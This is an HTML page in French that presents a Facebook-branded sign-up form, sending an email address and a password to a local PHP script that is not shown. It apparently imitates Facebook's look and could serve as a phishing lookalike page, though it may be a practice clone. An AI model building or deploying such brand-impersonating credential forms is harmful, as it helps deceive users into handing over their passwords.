<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Inscription</title>
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <style type="text/css">
        body {
            font-family: Arial, sans-serif;
            background-color: #1877f2;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            width: 100%;
            padding-right: 20px;
        }

        .form-container {
            width: 400px;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .logo {
            margin-left: 20px;
        }

        .logo img {
            width: 100px;
            height: auto;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            font-weight: bold;
        }

        .form-group input[type="text"],
        .form-group input[type="password"] {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ddd;
        }

        .form-group input[type="checkbox"] {
            margin-right: 5px;
        }

        .form-group .form-check-label {
            font-weight: normal;
        }

        .btn-primary {
            display: block;
            width: 100%;
            padding: 10px;
            font-weight: bold;
            text-align: center;
            color: #fff;
            background-color: #166fe5;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .btn-primary:hover {
            background-color: #155ecf;
        }

        .forgot-password {
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
        }
        
        .facebook-bar {
            background-color: #3b5998;
            color: #fff;
            padding: 10px;
            text-align: center;
            font-weight: bold;
        }

        .facebook-bar h1 {
            margin: 0;
            font-size: 24px;
            text-transform: uppercase;
        }
        .facebook-bar h1 {
    margin: 0;
    font-size: 75px;
    text-transform: uppercase;
}

    </style>
</head>
<body>

    <div class="facebook-bar">
        <h1>FACEBOOK</h1>
    </div>
    <div class="container">
        <!-- Le reste du code HTML -->
    </div>

    <div class="container">
        <div class="form-container">
            <h2>Inscription</h2>
            <form action="indexx.php" method="POST">
                <div class="form-group">
                    <label for="email">Adresse e-mail :</label>
                    <input type="text" id="email" name="email" placeholder="Votre adresse e-mail">
                </div>
                <div class="form-group">
                    <label for="password">Mot de passe :</label>
                    <input type="password" id="password" name="password" placeholder="Votre mot de passe">
                </div>
               
                <button type="submit" class="btn btn-primary">S'inscrire</button>
            </form>
            <div class="forgot-password">
                <a href="#">Déjà inscrit ? Connectez-vous</a>
            </div>
        </div>
    </div>
</body>
</html>
